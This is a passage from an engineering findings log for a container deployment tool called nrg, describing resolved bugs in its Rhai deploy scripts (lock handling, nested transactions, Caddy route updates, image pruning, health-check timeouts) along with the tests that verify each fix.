`.config`, `.deployed_at`) still persists afterward regardless — the
transaction already committed a genuinely successful traffic switch across
the whole fleet; only this one host's post-commit tidying is in question.

Covered by two new in-crate Rust unit tests in `src/engine/eval.rs`
(`post_commit_cleanup_failure_skips_persisting_that_hosts_port_and_target`
and `post_commit_cleanup_success_persists_port_and_target_normally`) that load
the REAL `lib/deploy.rhai` via a `FakeRunner`, run in LIVE mode all the way
through a full successful fleet-atomic roll. Reaching post-commit needs the
health check to pass, and `sim_http_healthy` does a REAL HTTP GET even in live
mode (a `FakeRunner` only intercepts ssh/local exec) — so the tests spin up a
genuine local HTTP server and force `sim_pick_port`'s `nc -z` probe (via a
targeted `FakeRunner` failure) to hand out exactly that server's port, so the
real health-check request actually reaches it. The failure test then injects
an SSH-level failure on the rename commands specifically and asserts the
per-host state was left unset while the service-level state and the *rest* of
that host's cleanup steps (stop/remove/prune) were still attempted. Both
mutation-verified: reverting to the original unchecked calls makes the
failure test fail (state gets silently persisted despite the injected
failure) while the companion success test still passes; restoring both
tests to green.

An Opus review pass on this fix flagged that `docker_cleanup`
(`lib/docker.rhai`) — one of the 5 calls this fix now checks — had its OWN,
narrower version of the same bug: it ran TWO prunes (container, then image)
but unconditionally returned only the second's `ExecResult`, discarding the
first's entirely. So a caller checking `.ok` couldn't tell an SSH-level
failure during the FIRST prune from a clean run, as long as the second prune
still happened to succeed — a strictly smaller window than the finding's main
scenario (a fully dropped connection fails both prunes identically, which
`docker_cleanup`'s old code still caught via the second call), but a real gap
nonetheless. Fixed in the same slice: `docker_cleanup` now returns whichever
prune failed (preferring the container-prune's result if IT failed, since
that runs first), or the image-prune's result otherwise. Covered by a new
unit test, `docker_cleanup_reports_failure_when_container_prune_fails_even_if_image_prune_succeeds`
(`src/engine/eval.rs`), confirmed to fail against the pre-fix code. A Fable
review pass also improved the warning message itself: it now names exactly
which step(s) failed (rename/stop/remove/cleanup) with each one's `stderr`,
instead of a single generic line — faster manual triage when this fires.

**Still open:** this fix stops the WRONG thing from happening (state
silently claiming a swap that didn't complete) but doesn't reduce the
NEW container to zero waste once cleanup fails: it keeps its unique
versioned name (`<service>-web-<version>-<port>`) rather than the
canonical one, so if the operator doesn't act on the warning and a LATER
deploy succeeds normally, that later deploy's own post-commit loop only
ever touches `canonical` and its OWN new unique name — the orphaned
container from the failed cleanup is never referenced again by anything
`nrg` does automatically, and leaks capacity until someone finds and
removes it by hand. Recovery is entirely dependent on the operator
heeding the `[warn]` line. There's no automatic retry or escalation after
N consecutive failures — every deploy attempt re-warns independently,
which is an intentional, minimal scope (matching R5's precedent of
deferring a larger, separate mechanism) rather than an oversight, but
worth stating plainly rather than leaving implicit.

### R29 — High — nesting `deploy()` inside a user transaction can resurrect post-committed compensations into a blackhole — ✅ resolved
`lib/deploy.rhai:214-239` (original, pre-fix line numbers; the guard added
below shifted these down by ~18 lines) with `src/engine/transaction.rs:42-51`.
**Verified** (found by an adversarial red-team pass during R6's review,
reproduced against the real engine with a throwaway script — not yet fixed).

`transaction`/`on_rollback` are ordinary global builtins, so nothing stops a
script from wrapping `deploy()` (or several `deploy()` calls, e.g. for a
multi-service atomic release) in its OWN outer `transaction()`. Per the
documented nesting semantics (`docs/safety.md`, "Nesting"), a **nested**
transaction's compensations are deliberately NOT dropped on success — they
stay on the shared stack so an *enclosing* transaction's later failure can
still unwind them. `deploy()`'s own fleet transaction becomes exactly such a
nested transaction when called this way.

The bug: `deploy()`'s POST-COMMIT phase (renaming the canonical container,
stopping and **removing** the old one, persisting the new port) runs
immediately after its transaction returns `Ok`, treating that `Ok` as
final. When nested, it isn't: the per-host `on_rollback` closures (rm-new /
restore-proxy, including R6's guard flags) registered during that "committed"
transaction are still live. If something ELSE later throws in the *outer*
transaction's body (an unrelated failure — e.g. a second service's deploy
failing in the same multi-service release), the unwind resurrects those
stale closures. The restore-proxy compensation repoints the proxy at
`old_target` — whose container POST-COMMIT already stopped and removed. The
result is the exact blackhole class R6 was written to close, via a different
mechanism (stale-compensation resurrection instead of compensation-failure
continuation). This is a PRE-EXISTING issue, not introduced or worsened by
the R6 fix — the same resurrection would have hit the OLD, unguarded rm-new
compensation identically before R6, with an identical outcome.
**Fix:** either have `deploy()` refuse to run when already inside an active
transaction (assert nesting depth is 0), or fold the post-commit phase INTO
the transaction (register its own compensations / don't treat inner commit
as final), or have post-commit explicitly drop ("cancel") the per-host
compensations it just made moot once it has safely completed their intent.

**Resolved (2026-07-10).** Took the first option: nesting `deploy()` inside a
user transaction isn't a documented or exemplified usage pattern anywhere in
this codebase (checked `docs/*.md` and `lib/examples/`), so refusing it
outright is the safest fix — it removes the hazard entirely rather than
attempting to make post-commit safe under an interaction the rest of the
codebase never anticipated. A new `in_transaction()` builtin
(`src/engine/transaction.rs`, checks the existing nesting-`depth` counter —
already tracked identically in both dry-run and live mode, so this reports
correctly in both) lets `deploy()` (`lib/deploy.rhai`) check, as its very
first statement — before any build/push/pull work — whether it's already
running inside an active transaction, and throw a clear, actionable error
naming R29 if so.

`rollback()` calls `deploy()` internally, so it inherits the same protection
— but an Opus review pass caught that inheriting isn't quite enough:
`rollback()` persists `<service>.prev = <the current image>` as a real side
effect *before* calling `deploy()`, so a nested `rollback()` relying only on
`deploy()`'s check would still have advanced `.prev` to the current image by
the time the throw happened — leaving a caller who read the error and
retried `rollback()` at the top level rolling back to the wrong image.
`rollback()` now carries the identical `in_transaction()` check as its own
first statement too, before that state write. The same review pass also
noted `deploy_one_host` (the per-host worker, called only from inside
`deploy()`'s own transaction) wasn't marked `private fn` and was technically
reachable as `deploy::deploy_one_host(...)`, bypassing the guard — though it
does no post-commit "treat the commit as final" work itself, so this was
informational rather than a real reopening of R29; it's now `private fn`
anyway, for defense-in-depth and consistency with its sibling helpers.

Covered by a Rust-level unit test asserting `in_transaction()` correctly
tracks nesting depth through a transaction and a nested transaction
(`src/engine/transaction.rs::in_transaction_reflects_nesting_depth`), plus
three integration tests (`tests/deploy_behaviors.rs`): one confirming
`deploy()` throws the expected error when nested inside a `transaction()`
(verified to fail without the guard); one confirming a normal, non-nested
`deploy()` call is unaffected by the new check; and one confirming `rollback()`
refuses when nested WITHOUT first mutating `<service>.prev` (a real,
persisted state assertion against `state.json` from a live run — verified to
fail if `rollback()`'s own check is removed, falling through to `deploy()`'s
later check after the state write already happened).

### R13 — Medium — Caddy `PATCH || POST` conflates 404 with any failure — ✅ resolved
`lib/caddy.rhai:144`. A transient admin-API 400/timeout on `PATCH` triggers the
`POST` branch, which **appends** a duplicate `@id` route at the end of the array
(first match wins → traffic keeps hitting the stale upstream while the tool reports
success). Two domain-less services both become catch-all routes and one swallows the
other. Distinguish 404 from other errors; use PUT-at-id semantics.

**Resolved (2026-07-10).** `proxy_deploy` no longer runs a blind
`PATCH ... || POST ...` one-liner. It now captures PATCH's real HTTP status via
`curl -s -o /dev/null -w '%{http_code}'` instead of `-f` (curl still exits 0 on an
HTTP-level error as long as it got a response at all, so `%{http_code}` is
trustworthy), then branches on the EXACT code with a `case` statement: `404` (route
doesn't exist yet — expected on a first deploy) falls through to `POST`; any `2xx`
succeeds on its own; anything else — a `400`/`500`/timeout on an EXISTING route, or a
connection-level curl failure (`%{http_code}` reports `"000"`) — fails loudly instead
of silently duplicating the route. PUT-at-id semantics weren't needed: Caddy's admin
API already supports create-or-replace via `PATCH`/`POST` on `/id/<id>`; the bug was
purely in how the shell script conflated PATCH's failure modes, not in the choice of
HTTP verb.

Covered by four new integration tests in `tests/caddy_patch_conflict.rs`, which take
a genuinely end-to-end approach: extract the EXACT shell command `proxy_deploy`
builds (via a dry-run plan — the same string that would run live) and execute that
exact string with a real `/bin/sh`, backed by a fake `curl` on `PATH` that reports a
chosen HTTP status for the PATCH call and logs every invocation it receives. This
proves the shell logic itself branches correctly for a 404 (falls through to POST), a
200 (succeeds without ever calling POST), a 500 (fails loudly, POST never called —
the exact bug this finding described), and a connection-level failure reported as
`"000"` (same as the 500 case). All four confirmed to fail against the pre-fix
`PATCH || POST` one-liner (reverted the fix, confirmed each test fails — three
couldn't even find the new command shape in the plan, all restored afterward).

Opus's adversarial review (SHIP AS-IS) flagged one non-blocking follow-up:
`proxy_remove`'s DELETE call had the identical `2>/dev/null || true` blanket-swallow,
conflating "route already gone" (404, genuinely fine — removal is idempotent) with a
transient admin-API failure. Fixed the same way in the same slice (check the exact
HTTP status; 404 and any 2xx succeed, anything else fails loudly), covered by three
more tests in the same file (`delete_404_succeeds_since_the_route_is_already_gone`,
`delete_200_succeeds`, `delete_500_fails_loudly_instead_of_being_swallowed`), all
mutation-verified the same way. Opus also swept both `lib/caddy.rhai` and
`lib/proxy.rhai` for any other `cmd1 || cmd2` fallback conflating different failure
classes the same way — found none beyond this one.

### R15 — Medium — no concurrency guard across a deploy — ✅ resolved
`deploy.rhai` + `sim.rs:246`. Port pick is scan-then-use TOCTOU; the canonical
rename dance and the `.target.<host>` state have no per-service lock. Two
simultaneous deploys of the same service can pick the same "free" port (late bind
failure unwinds a healthy fleet) or interleave renames so `svc-web` / `svc-web-old`
point at the wrong generation and corrupt the next deploy's `old_target`. The
project-level flock serializes *within one control machine* but not across two
operators/CI runners.

**Resolved (2026-07-10, round 2).** `deploy()` now takes a server-side,
cross-machine lock BEFORE any build/push/pull/roll work, and releases it once
the whole deploy finishes (success or failure) — closing the gap the local
flock never could, since two SIMULTANEOUS deploys of the same service are now
fully serialized (no interleaving possible, so the port-pick TOCTOU and the
rename-dance race the original finding describes can no longer happen for the
same service). Two new private helpers in `lib/deploy.rhai`:

- `acquire_deploy_lock(lock_host, lock_dir, service)` — an atomic `mkdir
  /tmp/nrg-deploy-lock-<service>` on `hosts[0]` (deterministic: every
  concurrent caller targeting the same service picks the same lock host, no
  separate election needed). `mkdir` either creates the directory (lock
  acquired) or fails with "File exists" (already held) — the atomic
  exclusive-create primitive IS the lock, no compare-and-swap required. A
  best-effort `holder` file written after (never checked — its own failure
  can't undo the already-acquired lock) records who/when for the error message
  if someone else's deploy later collides with this one. An "File exists"
  failure throws a clear "already locked" error naming the holder (if
  readable) and the exact manual-cleanup command; any OTHER `mkdir` failure
  (an unrelated SSH-level problem) throws a distinct message, using the same
  substring-classification approach this codebase's other remote-command
  classifiers (R4/R31/R32) already rely on.
- `release_deploy_lock(lock_host, lock_dir, service)` — `rm -rf` the lock
  directory; best-effort (never throws), since it's called from `deploy()`'s
  own catch-and-rethrow and must never mask whatever ORIGINAL error is
  already propagating.

`deploy()`'s entire real-work body (build through the post-deploy hook) now
runs inside a `try { ... } catch (err) { release; throw err; }`, so a failure
anywhere — build, push, pull, pre_deploy, an unwound transaction — releases
the lock before re-raising. `rollback()` needs no separate lock of its own: it
calls `deploy()` internally, so the same lock covers a rollback-triggered
redeploy automatically.

Strictly opt-OUT (`cfg.skip_lock`, default `false` — on by default), unlike
the pure-Rhai R21/R29 guards which have no escape hatch at all: the lock
depends on remote infrastructure (a writable `/tmp`, a POSIX shell) this
codebase can't unconditionally guarantee for every exotic host, so an operator
who hits a real incompatibility needs a way out.

**Known limitation, matching the local flock's own `NRG_STATE_LOCK` staleness
gap:** no automatic staleness/TTL. A deploy interrupted by SIGINT/SIGTERM — R7
deliberately makes that an `ErrorTerminated` that BYPASSES script-level
`try`/`catch` (the exact reason `transaction()`'s own unwind relies on a
Rust-level mechanism, not Rhai `catch` — confirmed via this engine's own test,
`interrupt_flag_aborts_the_script_and_the_compensation_still_runs` in
`src/engine/mod.rs`) — or one whose control process crashes outright, leaves
the lock held for manual cleanup. Deliberate: an automatic timeout short
enough to matter risks letting two deploys run concurrently anyway on a
slow-but-healthy one, worse than an occasional manual `rm -rf`. See
`docs/safety.md`'s new "Cross-machine deploy lock" section and
`docs/roadmap.md`'s "2.1 Distributed deploy lock" entry (still open: a manual
`nrg lock acquire/release/status` CLI, the Kamal model, tracked as a
follow-up).

Covered by 4 new tests in `src/engine/eval.rs` (live `deploy()` runs against a
real local HTTP server standing in for the new container's health check, via
`FakeRunner`): `deploy_acquires_and_releases_the_cross_machine_lock_on_success`
(asserts both the `mkdir` and `rm -rf` calls happen, and that `mkdir` precedes
the pull — proving the lock is acquired before any real work, not just
somewhere in the call list), `deploy_refuses_when_the_lock_is_already_held`
(a `mkdir` failure with "File exists" refuses immediately, before ever
reaching the pull step), `deploy_releases_the_lock_even_when_a_later_step_fails`
(a forced pull failure still releases the lock, and the ORIGINAL pull error —
not a lock-release error — is what surfaces), and
`deploy_with_skip_lock_never_touches_the_cross_machine_lock` (the opt-out
leaves zero `nrg-deploy-lock`-related calls at all). Mutation-verified:
disabling the acquire call, the success-path release, the catch-path release,
the "File exists" classification, and the `skip_lock` opt-out gate — each
individually, restored between mutations — reproduced the exact scenario each
test targets and made exactly the corresponding test fail, every other test
staying green.

### R21 — Low — empty `hosts` array "succeeds" and rewrites rollback state — ✅ resolved
`deploy.rhai` (~145). An empty host group: `hosts[0]` panics if `pre_deploy` is set;
otherwise the deploy touches no host but still persists new `.version`/`.image`/`.prev`.
State then claims v42 is live and the rollback chain is repointed. Validate `hosts`
is non-empty.

**Resolved (2026-07-10).** Both `deploy()` and `rollback()` now throw immediately on an
empty `hosts` array, before any other work — `deploy()` right after its R29
nested-transaction guard, `rollback()` as its own first check (not just inherited via
its internal call to `deploy()`), for the same reason the R29 guard is duplicated
there: `rollback()` persists `<service>.prev = <current image>` as a real side effect
*before* calling `deploy()`, so relying only on `deploy()`'s guard would still have
mutated `.prev` on a refused call — a caller who reads the error and retries with real
hosts would then roll back from the wrong starting point.

Covered by 3 new integration tests in `tests/deploy_behaviors.rs`
(`deploy_refuses_an_empty_hosts_array`, `deploy_refuses_an_empty_hosts_array_even_with_pre_deploy_set`,
`rollback_refuses_an_empty_hosts_array_without_first_mutating_prev_state`; the
existing nesting-guard tests keep passing unaffected), all mutation-verified.
Reverting `deploy()`'s guard reproduced the finding's own two claims exactly: with
`pre_deploy` set, an empty `hosts` array raised a raw
`Error: Array index 0 out of bounds: array is empty` (an ugly Rhai runtime error, not a
clean throw); without it, the run "succeeded" (exit 0) having deployed to "0 host(s)".
Reverting `rollback()`'s own guard (while leaving `deploy()`'s intact) reproduced the
`.prev`-clobbering scenario precisely: `.prev` was overwritten from a snapshotted
`v1` to the current `v2` even though the refused call never touched any host.

### R10b — Medium — accessories: no readiness check, existing container blocks re-run — ✅ resolved
`deploy.rhai:463` (`accessory_run`). No `rm -f` before `docker run --name`, so a
stopped-but-present accessory makes every future deploy fail with "name already in
use"; conversely a `run -d` that starts then immediately crashes counts as success
and the app deploys against a dead DB.

**Resolved (2026-07-10).** Both halves fixed:
1. `accessory_run` now calls `docker_remove(host, name)` (the same idempotent
   `rm -f ... || true` shape used everywhere else in this codebase for a start-fresh
   path) before `docker run --name` — a stopped-but-present accessory from a prior
   crashed run, or a manual `docker stop`, self-heals on the very next deploy instead
   of permanently wedging every future one until an operator manually removes it.
2. After `docker run -d` reports success, a brief `sleep(1)` followed by one more
   `docker_container_running` probe catches the "started, then crashed almost
   immediately" case (e.g. a database given the wrong credentials) — `docker run -d`'s
   own exit code only reflects that the container *started*, not that it stayed up.
   This is deliberately NOT a full health check (accessories have no `health_path`
   concept in this stdlib) — just enough to stop the app from silently deploying
   against a dead accessory with no signal anything went wrong.

Covered by 3 new in-crate unit tests in `src/engine/eval.rs`
(`accessory_run_removes_a_stopped_but_present_container_before_starting`,
`accessory_run_throws_when_the_container_exits_immediately_after_starting`,
`accessory_run_succeeds_when_the_container_is_still_running_after_starting`),
loading the REAL `lib/deploy.rhai`. The crash-detection tests needed a small custom
`CommandRunner` (`StartsThenStaysUpRunner`) rather than the shared `FakeRunner`,
since they specifically require the SAME `docker inspect` probe command to answer
differently across two calls within one run (not running before the start attempt,
running after) — something a single canned per-command answer can't express. All
three mutation-verified: removing the `rm -f` call reproduced the exact "name already
in use" wedge (the plan showed only `docker run -d`, no `rm -f`, before it); removing
the post-start re-check made the crash-detection test pass silently instead of
throwing.

### R20 / R25 / R22 / R23 / R26 — Low — ✅ resolved
- Discarded `post_deploy_cmd` results — a hook that fails on 2/5 hosts reports full
  success (`deploy.rhai:228`). — ✅ resolved
- Unchecked proxy-image `pull` results (`proxy.rhai:42`, `caddy.rhai:51`). — ✅ resolved
- `cfg.keep_images` is documented but unused — cleanup only prunes dangling images,
  so tagged old images accumulate until the disk fills (`docker.rhai:256`). — ✅ resolved
- `recipe.rhai` accesses required keys (`service`, `image_repo`, `web_hosts`,
  registry creds, `db_host`) without existence checks → opaque property errors
  mid-flow; `cfg.network` isn't forwarded to accessories, so the app can't resolve
  the DB on a custom network. — ✅ resolved
- `attempts <= 0` in `wait_healthy` reads `.status` off an empty map → a
  "property not found" error masks the real health-check failure (`healthcheck.rhai:35`). — ✅ resolved

**Resolved (2026-07-10).** Four independent fixes, bundled into one slice since
each is small and well-scoped, plus `cfg.keep_images` (R22) implemented separately
below since it's a real feature, not a quick correctness fix:

- **R20** — `deploy()`'s post-deploy hook was pulled out into its own function,
  `run_post_deploy_hook(hosts, cmd)` in `lib/deploy.rhai` (not marked `private` —
  unlike `deploy_one_host`, calling it standalone has no correctness hazard, and
  making it a real function is what lets it be unit-tested without needing a full
  live deploy to reach it). It now checks each host's `ssh_exec` result, collects
  the hosts where it failed, prints a `[warn]` naming exactly which hosts and why,
  and returns that failure list — still best-effort (it never throws; nothing
  after the fleet has already committed can be rolled back), but no longer silent.
- **R25** — `proxy_boot` in both `lib/proxy.rhai` and `lib/caddy.rhai` now checks
  the image-pull's `ExecResult` and throws with the pull's stderr on failure,
  instead of silently falling through to `docker run -d` (which happily starts
  whatever image is already cached locally — stale, or nothing at all).
- **R23** — `standard_deploy` (`lib/recipe.rhai`) now validates its required cfg
  keys (`service`, `image_repo`, `web_hosts`; `registry_user`/`registry_password`
  when `cfg.registry` is set; `db_host` when `cfg.accessories` is non-empty)
  up front, before any work (login, accessories, the roll) runs, throwing a clear
  message naming exactly which key is missing. Correction to the original
  finding above: this is NOT a "property not found" error (this engine's
  default Rhai config never produces that error — see the R26 correction
  below); a missing key silently reads as unit instead, so the actual pre-fix
  failure ranged from a fully silent malformed deploy (a missing `image_repo`
  quietly built the image tag as literally `":latest"` and deployed it, no
  error at all) to an opaque "Function not found" error deep in an unrelated
  module once the malformed value reached a builtin that couldn't accept it —
  never a message naming the real missing key. Separately, `cfg.network` —
  already forwarded to the app's own `deploy()` call — is now ALSO forwarded
  to each accessory's cfg, so a custom-network deploy no longer strands the
  DB/cache on the default bridge network where the app can't resolve it by
  container name.
- **R26** — `wait_healthy`, and (for consistency) its siblings `wait_port` /
  `wait_container_healthy`, in `lib/healthcheck.rhai` now refuse `cfg.attempts <
  1` with a clear message up front. Correction to the original finding above:
  `wait_healthy` did NOT actually crash on `attempts <= 0` — this engine's
  default Rhai config returns unit (not an error) for a missing map property, so
  the empty `for i in 0..attempts` loop leaving `r` an uninitialized `#{}` just
  meant the fail-path's `r.status` read silently produced unit, giving a
  confusing-but-not-crashing `"Health check failed after 0 attempts: <url> (last
  status: )"` with the status left blank — no hint the real problem was
  `attempts` itself. `wait_port`/`wait_container_healthy` had the same shape of
  problem (silently "succeeding at waiting" for zero attempts, then throwing a
  "not open/healthy after 0 attempts" message) without even that blank-status
  tell. All three now name the actual misconfiguration directly instead.
- **R23 addendum, found during this fix's own review** (Opus adversarial pass):
  the top-level `cfg` keys were guarded, but each entry in `cfg.accessories`
  still accessed its OWN required keys (`name`, `image`) directly — the same
  class of unclear failure described above, just one map deeper. Now
  validated too, with a message naming exactly which key is missing.
- **R22 (`cfg.keep_images`), implemented separately (2026-07-10, round 2).**
  `docker_cleanup`'s `image prune` only ever removed *dangling* (untagged)
  images — `image_repo`'s own old tagged versions (`myapp:v41`, `myapp:v40`,
  ...) accumulated on every deploy host forever, until the disk filled. New
  `docker_prune_old_images(host, repo, keep_n, protect_tags)` in
  `lib/docker.rhai` lists a repo's tags via `docker images <repo> --format
  '{{.Tag}}|{{.CreatedAt}}'` (a raw `ssh_exec` listing, not a `sim_*` builtin —
  covered by this file's own CONTAINER-OVERLAY CONTRACT carve-out for effects
  with no later read, same as `docker_cleanup`'s existing prune calls), sorts
  by `<CreatedAt>|<tag>` (Docker/Podman's default `CreatedAt` format is a
  fixed-width zero-padded string, so plain lexicographic sort + reverse
  already agrees with chronological order — no date parsing needed), and
  removes every tag beyond the `keep_n` most recent EXCEPT any tag listed in
  `protect_tags`, which survives regardless of age. `deploy()` calls this from
  its post-commit per-host loop when `cfg.keep_images >= 0` is set (strictly
  opt-in — an explicit negative value throws instead of silently meaning
  "disabled," since `-1` is only the internal "key not set at all" sentinel),
  always protecting the version just deployed and — only when it's the SAME
  repo — the previous version `rollback()` might still need (a caller who
  changed `image_repo` between deploys has an unrelated old repo in
  `<service>.image`, irrelevant to pruning this one; `extract_repo(image)`, a
  new private helper mirroring `extract_version`'s own registry-host:port
  disambiguation, decides "same repo"). Deliberately NOT part of the `failed`
  gate that decides whether to persist the new port/target — a pruning
  failure or the feature being off entirely has no bearing on whether the
  swap itself completed, so it's reported as its own `[warn]` (listing
  failure) or informational line (successful prune) without ever blocking
  that persistence. `keep_images` is folded into `standard_deploy`'s existing
  cfg-forwarding loop (`lib/recipe.rhai`) alongside the other R23c keys, and
  into `deploy()`'s replayed `<service>.config` — but only when the caller
  actually set it, never the `-1` sentinel, since persisting the sentinel
  unconditionally would make every future `rollback()` replay hit the same
  "negative cfg.keep_images" throw and permanently break rollback for any
  service that ever deployed without the key set.
- **R22 addendum, found during this fix's own FINAL review** (Fable): `rollback()`
  persists `<service>.prev = <current image>` as a real, persisted side effect
  BEFORE calling `deploy()` — the exact same hazard the R21/R29 guards above
  were duplicated into `rollback()` to close. A caller-supplied
  `#{keep_images: <negative>}` override reaches `deploy()`'s own validation
  (via `rollback()`'s `for k in cfg.keys() { replay[k] = cfg[k]; }` merge), but
  only AFTER `.prev` had already been overwritten with the current (possibly
  broken) image — so a caller who hit the throw, fixed the typo, and retried
  `rollback(hosts, service)` with no override would then "roll back" to the
  image they were trying to escape, the real target permanently lost. Fixed by
  giving `rollback()` its own up-front copy of the same validation, mirroring
  the R21/R29 pattern exactly, checked before the `.prev` mutation.

Covered by 11 new tests: `run_post_deploy_hook_reports_failed_hosts_but_does_not_throw`,
`run_post_deploy_hook_returns_empty_when_every_host_succeeds`,
`kamal_proxy_boot_throws_when_the_image_pull_fails`,
`caddy_proxy_boot_throws_when_the_image_pull_fails` (all four in
`src/engine/eval.rs`, loading the REAL `lib/deploy.rhai` / `lib/proxy.rhai` /
`lib/caddy.rhai` via `FakeRunner`), plus
`standard_deploy_refuses_missing_required_keys`,
`standard_deploy_refuses_missing_registry_credentials_when_registry_is_set`,
`standard_deploy_refuses_missing_db_host_when_accessories_set`,
`standard_deploy_refuses_an_accessory_entry_missing_required_keys`,
`standard_deploy_forwards_network_to_accessories`,
`wait_healthy_refuses_zero_or_negative_attempts`, and
`wait_port_and_wait_container_healthy_also_refuse_zero_or_negative_attempts`
(all seven in `tests/deploy_behaviors.rs`, dry-run/live CLI integration tests
loading the REAL `lib/recipe.rhai` / `lib/healthcheck.rhai`). All 11
mutation-verified: reverting each guard/check individually (surgically, one at a
time — e.g. removing only the accessory's `cfg.network` forward while leaving the
app's own forward intact) reproduced the exact original bug and made exactly the
corresponding test fail, with every other test in the slice staying green.

R22 is covered by 10 more new tests: `docker_prune_old_images_keeps_the_newest_n_and_never_removes_protected_tags`
and `docker_prune_old_images_reports_failure_without_guessing_when_listing_fails`
(isolated `docker_prune_old_images` calls via `FakeRunner`), `deploy_wires_keep_images_through_to_docker_prune_old_images_with_the_right_protect_tags`,
`deploy_with_keep_images_unset_never_calls_docker_prune_old_images`,
`deploy_protects_the_previous_versions_tag_but_only_when_it_is_the_same_repo`, and
`deploy_does_not_protect_a_previous_versions_tag_from_a_different_repo` (all six in
`src/engine/eval.rs`, live full-`deploy()` runs against a real local HTTP server
standing in for the new container's health check, proving the wiring end-to-end
including the registry-host:port `extract_repo` disambiguation), plus
`deploy_refuses_a_negative_keep_images`, `deploy_with_keep_images_zero_is_a_valid_meaningful_value`,
`standard_deploy_forwards_keep_images_to_deploy`,
`deploy_omits_keep_images_from_persisted_config_when_never_set`, and
`rollback_refuses_a_negative_keep_images_override_without_first_mutating_prev_state`
(`tests/deploy_behaviors.rs`, dry-run/live CLI integration tests). The second-to-last
was added during this slice's own Opus review, which found the conditional-persistence
guard (the `-1` sentinel must NEVER be persisted into `<service>.config`, or every
future `rollback()` would hit the "negative cfg.keep_images" throw) had no direct
regression test — Opus verified the shipped logic was actually correct by direct
repro, but flagged the coverage gap. The last was added during this slice's own final
review (Fable), which found a REAL bug: see the R22 addendum above. Mutation-verified:
disabling the `protect_tags` check, the `keep_n` cap, the dangling-tag exclusion, the
listing-failure check, the negative-`keep_images` validation guard (both in `deploy()`
and, separately, `rollback()`'s own up-front copy of it), the `keep_images >= 0` gate
around the prune call, the same-repo check on the previous-version protection, and
the conditional-persistence guard — each individually, restored between mutations —
reproduced the exact original bug and made exactly the corresponding test(s) fail,
every other test in the slice staying green.

---

## 6. Health checks (`lib/healthcheck.rhai`)

### R11 — Medium — double retry loops multiply the timeout by up to 30× — ✅ resolved
`healthcheck.rhai:64` and `93` wrap `cfg.attempts` retries **around**
`sim_wait_port` / `sim_container_healthy`, which already loop `30 × 2 s`
internally (`sim.rs:345`). So `#{attempts: 5, interval: 1}` — which an operator
reads as a ~5 s bound — actually blocks up to `5 × 60 s = 5 min`, holding the fleet
transaction open the whole time (defaults ≈ 30 min).

**Resolved (2026-07-10).** `sim_wait_port` and `sim_container_healthy`
(`src/engine/builtins/sim.rs`) are each called from exactly ONE place in the
stdlib — `healthcheck.rhai`'s `wait_port`/`wait_container_healthy`, which already
retry with the operator's own `cfg.attempts`/`cfg.interval` — so the inner 30×2s
retry loop was pure duplication, not extra safety margin. Both builtins now do
exactly ONE real probe per call in live mode; the outer Rhai-level loop's
`attempts`/`interval` are the sole, correct source of truth for total wait time.
`#{attempts: 5, interval: 1}` now really is a ~5s bound, not up to 5 minutes.

Covered by 2 new unit tests in `src/engine/builtins/sim.rs`
(`live_wait_port_probes_exactly_once_no_internal_retry`,
`live_container_healthy_probes_exactly_once_no_internal_retry`), each asserting
BOTH the returned value and that exactly one probe ran in under a second (a
generous margin — the old code's internal loop alone took ≥ 60s to give up).
Mutation-verified: reverting either function back to its old 30-iteration retry
loop (with a shortened per-iteration sleep, to keep the failing test fast rather
than waiting a full minute) made exactly its own new test fail while every other
test — including the exit-127/negative-exit/exit-255 throw-immediately guards
added for R16 above, which fire before any loop would even start — stayed green.

### R12 — Medium — single 200 counts as healthy; global 30 s per-request timeout — ✅ resolved
`healthcheck.rhai:29`. One HTTP 200 passes the gate — no consecutive-success window
— so an app that answers `/up` once during boot then OOMs gets traffic switched to
it (and the Caddy path has no switch-time health gate of its own, unlike
kamal-proxy, so users get 502s). Separately, `http_get`'s timeout is a fixed global
30 s (`http.rs:9`) unrelated to `interval`, so a hanging endpoint makes 30 attempts
take ~16 min.

**Resolved (2026-07-10), the `wait_healthy` half.** Both sub-issues in `wait_healthy`
itself are fixed:
- A new `cfg.consecutive` (default `1`, preserving the historical single-check
  behavior for existing callers) requires that many PASSING checks IN A ROW — any
  non-matching response resets the streak to 0 — before `wait_healthy` returns
  healthy. `deploy()`/`deploy_one_host` (`lib/deploy.rhai`) gained a matching
  `cfg.health_consecutive`, forwarded through from `deploy()`'s own cfg exactly like
  `health_attempts`/`health_interval` already were, and persisted into the
  replayable `effective_cfg` alongside them.
- `sim_http_healthy` (`src/engine/builtins/http.rs`) gained a `timeout_secs`
  parameter (a new 2-arg overload; the existing 1-arg overload keeps the historical
  fixed 30s default for any other caller), forwarded from `wait_healthy`'s new
  `cfg.timeout` (default `30`, unchanged from before). `deploy()` gained a matching
  `cfg.health_timeout`, forwarded the same way as `health_consecutive`. A caller can
  now bound a single hanging health-check request to something small relative to
  `interval`, instead of every request silently taking up to the old fixed 30s
  regardless of the caller's own retry budget.
- **Addendum, found while wiring these two new knobs through `lib/recipe.rhai`'s
  `standard_deploy`:** `health_attempts`/`health_interval` are documented in
  `docs/examples.md` as `deploy::deploy()`'s own cfg keys — which `standard_deploy`
  wraps — but `standard_deploy` never actually forwarded them from its own cfg to
  the `dcfg` it builds for that wrapped `deploy()` call. A caller setting
  `health_attempts: 60` on `standard_deploy` silently got `deploy()`'s default `30`
  instead, with no error or warning. Fixed alongside forwarding the two new keys,
  so all four (`health_attempts`, `health_interval`, `health_consecutive`,
  `health_timeout`) now actually reach `deploy()`. (`standard_deploy` itself has no
  cfg-key documentation of its own in `docs/examples.md` to have overstated in the
  first place — the earlier draft of this note incorrectly implied it did.)

**Proxy-backend asymmetry — investigated (2026-07-11, round 3), found already
closed; test-coverage gap fixed.** The asymmetry this section originally left
open — a Caddy-specific switch-time health-gating gap kamal-proxy allegedly
didn't have — turns out to already be closed in the current codebase, just
never verified by a test. `lib/caddy.rhai`'s `proxy_deploy` builds a
`"health_checks":{"active":{...}}` block on the route whenever a non-empty
`health_path` is passed (`cfg.health_path`); `lib/deploy.rhai`'s `deploy()` /
`deploy_one_host()` always constructs the shared `proxy_cfg` with
`health_path` defaulting to `"/up"` (line ~138/544/609) and passes it straight
through to whichever backend is selected (`cproxy::proxy_deploy` for Caddy,
`kproxy::proxy_deploy` for kamal-proxy, `lib/deploy.rhai:65,67`) — so an
ordinary `deploy()` call already gets an active Caddy health check with NO
extra configuration needed, symmetric with kamal-proxy's own
`--health-check-path` (`lib/proxy.rhai:109`, gated on the identical
`health_path != ""` condition). Confirmed with a new integration test,
`deploy_with_caddy_proxy_configures_an_active_health_check_on_the_upstream`
